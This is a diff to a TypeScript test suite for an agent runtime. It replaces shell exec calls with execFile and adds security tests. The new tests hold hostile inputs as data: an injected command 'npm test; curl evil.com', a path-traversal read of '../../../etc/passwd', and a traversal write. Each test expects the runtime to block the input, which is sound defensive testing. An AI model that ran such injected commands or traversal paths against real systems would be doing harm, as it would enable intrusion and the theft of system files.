@@ -4,12 +4,12 @@ import { tmpdir } from "node:os";
 import path from "node:path";
 import process from "node:process";
 import { promisify } from "node:util";
-import { exec as childExec } from "node:child_process";
+import { execFile as childExecFile } from "node:child_process";
 import { runTask, ToolRegistry } from "@aex/runtime";
-import { parseFile } from "@aex/parser";
+import { parseFile, matchPattern, matchesAny } from "@aex/parser";
 import { taskToLangGraph } from "../../aex-langgraph/src/index.js";
 
-const exec = promisify(childExec);
+const execFile = promisify(childExecFile);
 
 const TOOLS: ToolRegistry = {
   "tests.success": {
@@ -301,7 +301,6 @@ check result.written
 
 return result
 `);
-    const dir = path.dirname(taskPath);
     const relative = "output.txt";
     const run = await runTask(taskPath, {
       inputs: {
@@ -334,30 +333,121 @@ return result
 
     const success = await runTask(taskPath, {
       inputs: {
-        test_cmd: 'node -e "process.exit(0)"',
+        test_cmd: "node -e process.exit(0)",
       },
     });
     expect(success.status).toBe("success");
 
     const failure = await runTask(taskPath, {
       inputs: {
-        test_cmd: 'node -e "process.exit(1)"',
+        test_cmd: "node -e process.exit(1)",
       },
     });
     expect(failure.status).toBe("blocked");
     expect(failure.issues[0]).toContain("Check");
   });
 
+  it("blocks command injection via shell metacharacters", async () => {
+    const taskPath = await writeTempTask(`agent runtime_injection v0
+
+goal "Test injection prevention"
+
+use tests.run
+
+need test_cmd: str
+
+do tests.run(cmd=test_cmd) -> result
+
+return result
+`);
+
+    const result = await runTask(taskPath, {
+      inputs: {
+        test_cmd: "npm test; curl evil.com",
+      },
+    });
+
+    expect(result.status).toBe("blocked");
+    expect(result.issues[0]).toContain("metacharacter");
+  });
+
+  it("blocks path traversal in file.read", async () => {
+    const taskPath = await writeTempTask(`agent runtime_traversal v0
+
+goal "Test path traversal prevention"
+
+use file.read
+
+need paths: list[str]
+
+do file.read(paths=paths) -> contents
+
+return contents
+`);
+
+    const result = await runTask(taskPath, {
+      inputs: {
+        paths: ["../../../etc/passwd"],
+      },
+    });
+
+    expect(result.status).toBe("blocked");
+    expect(result.issues[0]).toContain("outside the working directory");
+  });
+
+  it("blocks path traversal in file.write", async () => {
+    const taskPath = await writeTempTask(`agent runtime_write_traversal v0
+
+goal "Test path traversal prevention on write"
+
+use file.write
+
+do file.write(path="../../../tmp/evil.txt", contents="pwned") -> result
+
+return result
+`);
+
+    const result = await runTask(taskPath, {});
+
+    expect(result.status).toBe("blocked");
+    expect(result.issues[0]).toContain("outside the working directory");
+  });
+
+  it("handles return expressions with colons (URLs)", async () => {
+    const taskPath = await writeTempTask(`agent runtime_colon v0
+
+goal "Return value with URL"
+
+use tests.success
+
+do tests.success(input=true) -> outcome
+
+return {
+  status: "ok",
+  url: "https://example.com/path"
+}
+`);
+
+    const result = await runTask(taskPath, {
+      tools: TOOLS,
+    });
+
+    expect(result.status).toBe("success");
+    const output = result.output as Record<string, unknown>;
+    expect(output.status).toBe("ok");
+    expect(output.url).toBe("https://example.com/path");
+  });
+
   it("interacts with git tool helpers", async () => {
     const repoDir = await fs.mkdtemp(path.join(tmpdir(), "aex-git-"));
     process.chdir(repoDir);
-    await exec("git init", { cwd: repoDir });
-    await exec('git config user.email "ci@example.com"', { cwd: repoDir });
-    await exec('git config user.name "CI Bot"', { cwd: repoDir });
+    await execFile("git", ["init"], { cwd: repoDir });
+    await execFile("git", ["config", "user.email", "ci@example.com"], { cwd: repoDir });
+    await execFile("git", ["config", "user.name", "CI Bot"], { cwd: repoDir });
     const filePath = path.join(repoDir, "sample.txt");
     await fs.writeFile(filePath, "original\n", "utf8");
-    await exec("git add sample.txt", { cwd: repoDir });
-    await exec('git commit -m "init"', { cwd: repoDir });
+    await execFile("git", ["add", "sample.txt"], { cwd: repoDir });
+    await execFile("git", ["commit", "-m", "init"], { cwd: repoDir });
 
     await fs.writeFile(filePath, "original\nnext line\n", "utf8");
 
@@ -388,7 +478,7 @@ return diff
     expect(String(diffResult.output)).toContain("sample.txt");
 
     const patch = String(diffResult.output);
-    await exec("git checkout -- sample.txt", { cwd: repoDir });
+    await execFile("git", ["checkout", "--", "sample.txt"], { cwd: repoDir });
 
     const applyTask = path.join(repoDir, "apply.aex");
     await fs.writeFile(
@@ -441,5 +531,31 @@ return outcome
     const plan = taskToLangGraph(parsed.task);
     expect(Object.keys(plan.nodes)).toHaveLength(parsed.task.steps.length);
     expect(plan.start).toBeDefined();
+  });
+});
+
+describe("matchPattern", () => {
+  it("matches exact tool names", () => {
+    expect(matchPattern("file.read", "file.read")).toBe(true);
+    expect(matchPattern("file.read", "file.write")).toBe(false);
+  });
+
+  it("matches wildcards with dot boundary", () => {
+    expect(matchPattern("network.fetch", "network.*")).toBe(true);
+    expect(matchPattern("network.post", "network.*")).toBe(true);
+    expect(matchPattern("network", "network.*")).toBe(true);
+    expect(matchPattern("networkx.fetch", "network.*")).toBe(false);
+    expect(matchPattern("net", "network.*")).toBe(false);
+  });
+
+  it("matches catch-all wildcard", () => {
+    expect(matchPattern("anything.at.all", "*")).toBe(true);
+  });
+});
+
+describe("matchesAny", () => {
+  it("returns true when any pattern matches", () => {
+    expect(matchesAny("file.read", ["network.*", "file.*"])).toBe(true);
+    expect(matchesAny("file.read", ["network.*", "shell.*"])).toBe(false);
   });
 });
